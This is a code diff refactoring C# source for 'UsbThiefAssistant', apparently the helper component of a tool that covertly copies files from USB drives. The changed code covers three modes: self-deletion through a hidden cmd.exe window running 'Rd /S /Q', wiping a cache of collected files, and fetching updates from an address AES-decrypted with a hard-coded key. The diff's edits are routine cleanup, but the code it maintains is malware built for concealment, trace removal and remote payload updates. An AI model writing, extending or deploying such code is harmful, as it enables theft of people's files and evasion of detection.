@@ -20,25 +20,31 @@ namespace UsbThiefAssistant
             string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
             if (args.Length < 2)
                 Environment.Exit(0);
-            foreach (var item in Process.GetProcessesByName("fileassistant"))
-            {
-                if (item.Id != Process.GetCurrentProcess().Id)//这里必须用Id，不然无法启动
-                    item.Kill();
-            }
+
             switch (args[1])
             {
                 case "-startup":
+                    KillPreviousProcess();
+                    KillProcess();
                     Startup();
                     break;
                 case "-clean":
+                    KillPreviousProcess();
+                    KillProcess();
                     Clean();
                     break;
                 case "-suicide":
+                    KillPreviousProcess();
+                    KillProcess();
                     Suicide();
                     break;
                 default:
                     if (args[1].StartsWith("-update="))
+                    {
+                        KillPreviousProcess();
+                        KillProcess();
                         Upd(args[1].Substring(8));
+                    }
                     break;
             }
             InitializeComponent();
@@ -51,6 +57,20 @@ namespace UsbThiefAssistant
         protected override void SetVisibleCore(bool value)
         {
             base.SetVisibleCore(value);
+        }
+        private void KillPreviousProcess()
+        {
+            try
+            {
+                foreach (var item in Process.GetProcessesByName("fileassistant"))
+                {
+                    if (item.Id != Process.GetCurrentProcess().Id)//这里必须用Id，不然无法启动
+                        item.Kill();
+                }
+            }
+            catch (Exception)
+            {
+            }
         }
         private void KillProcess()
         {
@@ -117,30 +137,25 @@ namespace UsbThiefAssistant
                 return Encoding.UTF8.GetString(resultArray);
             }
         }
-        ///<summary>
-        /// 下载文件
-        /// </summary>
-        /// <param name="URL">下载文件地址</param>
-        /// <param name="Filename">下载后另存为（全路径）</param>
-        private bool DownloadFile(string URL, string filename)
+        private bool DownloadFile(string url, string fileName)
         {
             try
             {
-                HttpWebRequest Myrq = (HttpWebRequest)WebRequest.Create(URL);
-                HttpWebResponse myrp = (HttpWebResponse)Myrq.GetResponse();
+                HttpWebRequest myrq = (HttpWebRequest)WebRequest.Create(url);
+                HttpWebResponse myrp = (HttpWebResponse)myrq.GetResponse();
                 Stream st = myrp.GetResponseStream();
-                Stream so = new FileStream(filename, FileMode.Create);
+                Stream so = new FileStream(fileName, FileMode.Create);
                 byte[] by = new byte[1024];
-                int osize = st.Read(by, 0, by.Length);
-                while (osize > 0)
+                int oSize = st.Read(by, 0, by.Length);
+                while (oSize > 0)
                 {
-                    so.Write(by, 0, osize);
-                    osize = st.Read(by, 0, by.Length);
+                    so.Write(by, 0, oSize);
+                    oSize = st.Read(by, 0, by.Length);
                 }
                 so.Close();
                 st.Close();
                 myrp.Close();
-                Myrq.Abort();
+                myrq.Abort();
                 return true;
             }
             catch (Exception)
@@ -185,7 +200,6 @@ namespace UsbThiefAssistant
         }
         private void Clean()
         {
-            KillProcess();
             DeleteFolder(path + @"\data\diskcache\files\");
             try
             {
@@ -219,7 +233,6 @@ namespace UsbThiefAssistant
             catch (Exception)
             {
             }
-            KillProcess();
             ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C Timeout /T 5 & Rd /S /Q " + "\"" + path + "\"")
             {
                 WindowStyle = ProcessWindowStyle.Hidden,
@@ -236,7 +249,7 @@ namespace UsbThiefAssistant
         private void Upd(string text)
         {
             string addr = AesDecrypt(text, "TFOKUiRKVwQPUxaGc4AMOoAmshXao29j");
-            string r = @"((http|ftp|https)://)(([a-zA-Z0-9\._-]+\.[a-zA-Z]{2,6})|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\&%_\./-~-]*)?";
+            string r = @"((http|https)://)(([a-zA-Z0-9\._-]+\.[a-zA-Z]{2,6})|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\&%_\./-~-]*)?";
             Regex regex = new Regex(r);
             if (regex.IsMatch(addr))
             {
